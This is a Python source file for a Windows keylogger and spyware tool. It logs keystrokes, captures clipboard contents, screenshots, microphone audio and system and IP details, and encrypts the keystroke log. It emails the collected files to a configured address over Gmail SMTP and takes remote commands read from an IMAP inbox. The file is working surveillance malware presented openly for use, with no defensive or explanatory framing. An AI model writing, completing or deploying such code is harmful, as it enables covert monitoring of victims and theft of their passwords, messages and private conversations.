import imaplib
import email
import os
import platform
import socket
import smtplib
import logging
import threading
import queue
import time
import schedule
import requests
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
from PIL import ImageGrab
import win32clipboard
from datetime import datetime
from typing import List, Optional
from dataclasses import dataclass

# Configuration class
@dataclass
class Config:
    email_address: str = "your-email@gmail.com"  # Your Gmail address
    email_password: str = "your-app-password"    # Gmail App Password
    to_address: str = "recipient-email@gmail.com"  # Email to send logs
    key: bytes = b'your-encryption-key'          # Fernet encryption key
    file_path: str = "folder-where-you-want-to-save-logs"   # Log storage path
    keys_information: str = "key_log.txt"        # Keystroke log file
    system_information: str = "systeminfo.txt"   # System info file
    clipboard_information: str = "clipboard.txt" # Clipboard log file
    audio_information: str = "audio.wav"         # Audio file
    screenshot_information: str = "screenshot.png"  # Screenshot file
    max_retries: int = 3                         # Email retry attempts
    retry_delay: float = 5.0                     # Delay between retries
    audio_duration: int = 10                     # Audio recording duration (seconds)
    max_file_age_days: int = 7                   # Max age for log files

# Initialize logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='keylogger.log'
)

class Keylogger:
    def __init__(self):
        self.config = Config()
        self.keys: List = []
        self.count: int = 0
        self.current_time: float = time.time()
        self.stopping_time: float = float('inf')
        self.listener: Optional[Listener] = None
        self.command_queue = queue.Queue()
        self.running = True
        self.lock = threading.Lock()
        self.extend = "\\"
        self.file_merge = self.config.file_path + self.extend

    def setup_directories(self) -> None:
        """Create required directories if they don't exist"""
        try:
            os.makedirs(self.config.file_path, exist_ok=True)
            logging.info(f"Directory ensured: {self.config.file_path}")
        except Exception as e:
            logging.error(f"Failed to create directory: {str(e)}")

    def send_email(self, filename: str, attachment: str, retry_count: int = 0) -> bool:
        """Send email with attachment with retry mechanism"""
        try:
            msg = MIMEMultipart()
            msg['From'] = self.config.email_address
            msg['To'] = self.config.to_address
            msg['Subject'] = f"Log File - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            msg.attach(MIMEText(f"Log file from {platform.node()}", 'plain'))

            with open(attachment, 'rb') as attachment_file:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment_file.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename= {filename}")
                msg.attach(part)

            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(self.config.email_address, self.config.email_password)
                server.sendmail(self.config.email_address, self.config.to_address, msg.as_string())
            
            logging.info(f"Successfully sent email with attachment: {filename}")
            return True

        except Exception as e:
            logging.error(f"Failed to send email: {str(e)}")
            if retry_count < self.config.max_retries:
                time.sleep(self.config.retry_delay)
                return self.send_email(filename, attachment, retry_count + 1)
            return False

    def computer_information(self) -> None:
        """Gather and save system information"""
        try:
            with open(self.file_merge + self.config.system_information, "a") as f:
                hostname = socket.gethostname()
                ip_addr = socket.gethostbyname(hostname)
                
                try:
                    public_ip = requests.get("https://api.ipify.org").text
                    f.write(f"Public IP Address: {public_ip}\n")
                except Exception:
                    f.write("Couldn't get Public IP Address\n")
                
                f.write(f"Processor: {platform.processor()}\n")
                f.write(f"System: {platform.system()} {platform.version()}\n")
                f.write(f"Machine: {platform.machine()}\n")
                f.write(f"Hostname: {hostname}\n")
                f.write(f"Private IP Address: {ip_addr}\n")
                
                logging.info("System information collected")
                
        except Exception as e:
            logging.error(f"Error collecting system information: {str(e)}")

    def copy_clipboard(self) -> None:
        """Copy clipboard contents"""
        with self.lock:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                
                with open(self.file_merge + self.config.clipboard_information, "a") as f:
                    f.write(f"Clipboard Data [{datetime.now()}]: \n{pasted_data}\n")
                logging.info("Clipboard data collected")
            except Exception as e:
                logging.error(f"Error copying clipboard: {str(e)}")

    def microphone(self) -> None:
        """Record audio"""
        try:
            fs = 44100
            myrecording = sd.rec(int(self.config.audio_duration * fs), samplerate=fs, channels=2)
            sd.wait()
            write(self.file_merge + self.config.audio_information, fs, myrecording)
            logging.info("Audio recorded successfully")
        except Exception as e:
            logging.error(f"Error recording audio: {str(e)}")

    def screenshot(self) -> None:
        """Take screenshot"""
        try:
            im = ImageGrab.grab()
            im.save(self.file_merge + self.config.screenshot_information)
            logging.info("Screenshot captured successfully")
        except Exception as e:
            logging.error(f"Error taking screenshot: {str(e)}")

    def on_press(self, key) -> None:
        """Handle key press events"""
        with self.lock:
            self.keys.append(key)
            self.count += 1
            self.current_time = time.time()
            
            if self.count >= 1:
                self.count = 0
                self.write_file(self.keys)
                self.keys = []

    def write_file(self, keys: List) -> None:
        """Write keys to file"""
        try:
            with open(self.file_merge + self.config.keys_information, "a") as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    if k.find("space") > 0:
                        f.write('\n')
                    elif k.find("Key") == -1:
                        f.write(k)
        except Exception as e:
            logging.error(f"Error writing keys to file: {str(e)}")

    def on_release(self, key) -> bool:
        """Handle key release events"""
        if key == Key.esc or self.current_time > self.stopping_time:
            return False
        return True

    def clean_old_files(self) -> None:
        """Remove files older than max_file_age_days"""
        try:
            now = time.time()
            for filename in os.listdir(self.config.file_path):
                file_path = os.path.join(self.config.file_path, filename)
                if os.path.isfile(file_path):
                    file_age = now - os.path.getmtime(file_path)
                    if file_age > (self.config.max_file_age_days * 24 * 60 * 60):
                        os.remove(file_path)
                        logging.info(f"Removed old file: {filename}")
        except Exception as e:
            logging.error(f"Error cleaning old files: {str(e)}")

    def read_email(self) -> None:
        """Read emails and process commands"""
        try:
            with imaplib.IMAP4_SSL("imap.gmail.com") as mail:
                mail.login(self.config.email_address, self.config.email_password)
                mail.select("inbox")
                _, search_data = mail.search(None, 'UNSEEN')
                
                for num in search_data[0].split():
                    _, data = mail.fetch(num, '(RFC822)')
                    email_message = email.message_from_bytes(data[0][1])
                    
                    if email_message['from'].lower().find(self.config.to_address.lower()) != -1:
                        for part in email_message.walk():
                            if part.get_content_type() == "text/plain":
                                body = part.get_payload(decode=True).decode().lower()
                                self.command_queue.put(body)
                
                logging.info("Email check completed")
        except Exception as e:
            logging.error(f"Error reading email: {str(e)}")

    def process_commands(self) -> None:
        """Process queued commands"""
        while not self.command_queue.empty():
            command = self.command_queue.get()
            
            if "start" in command:
                threading.Thread(target=self.start_keylogger, daemon=True).start()
            elif "stop" in command:
                self.stop_keylogger()
            elif "screenshot" in command:
                self.screenshot()
                self.send_email(self.config.screenshot_information, 
                              self.file_merge + self.config.screenshot_information)
            elif "record" in command:
                self.microphone()
                self.send_email(self.config.audio_information, 
                              self.file_merge + self.config.audio_information)
            elif "copy" in command:
                self.copy_clipboard()
                self.send_email(self.config.clipboard_information, 
                              self.file_merge + self.config.clipboard_information)
            elif "sysinfo" in command:
                self.computer_information()
                self.send_email(self.config.system_information, 
                              self.file_merge + self.config.system_information)
            elif "cleanup" in command:
                self.clean_old_files()
            elif "status" in command:
                self.send_status_report()

    def send_status_report(self) -> None:
        """Send system status report"""
        try:
            status_file = "status_report.txt"
            with open(self.file_merge + status_file, "w") as f:
                f.write(f"Keylogger Status Report - {datetime.now()}\n")
                f.write(f"Running: {self.running}\n")
                f.write(f"Listener Active: {self.listener is not None}\n")
                f.write(f"Pending Commands: {self.command_queue.qsize()}\n")
                f.write(f"Last Activity: {datetime.fromtimestamp(self.current_time)}\n")
            
            self.send_email(status_file, self.file_merge + status_file)
            logging.info("Status report sent")
        except Exception as e:
            logging.error(f"Error sending status report: {str(e)}")

    def start_keylogger(self) -> None:
        """Start keylogger in a separate thread"""
        self.current_time = time.time()
        self.stopping_time = float('inf')
        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
        logging.info("Keylogger started")
        self.listener.start()
        self.listener.join()

    def stop_keylogger(self) -> None:
        """Stop keylogger and encrypt data"""
        try:
            if self.listener:
                self.listener.stop()
                self.listener = None
                
            with open(self.file_merge + self.config.keys_information, "r") as f:
                data = f.read()
            
            encrypted_data = Fernet(self.config.key).encrypt(data.encode())
            with open(self.file_merge + self.config.keys_information, "wb") as f:
                f.write(encrypted_data)
                
            self.send_email(self.config.keys_information, 
                          self.file_merge + self.config.keys_information)
            self.stopping_time = time.time()
            logging.info("Keylogger stopped and data sent")
        except Exception as e:
            logging.error(f"Error stopping keylogger: {str(e)}")

    def run(self) -> None:
        """Main running loop"""
        self.setup_directories()
        self.computer_information()  # Initial system info collection
        
        # Start email checking thread
        email_thread = threading.Thread(target=self.email_checker, daemon=True)
        email_thread.start()
        
        while self.running:
            schedule.run_pending()
            self.process_commands()
            time.sleep(1)

    def email_checker(self) -> None:
        """Email checking loop"""
        schedule.every(1).minutes.do(self.read_email)
        while self.running:
            schedule.run_pending()
            time.sleep(1)

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.run()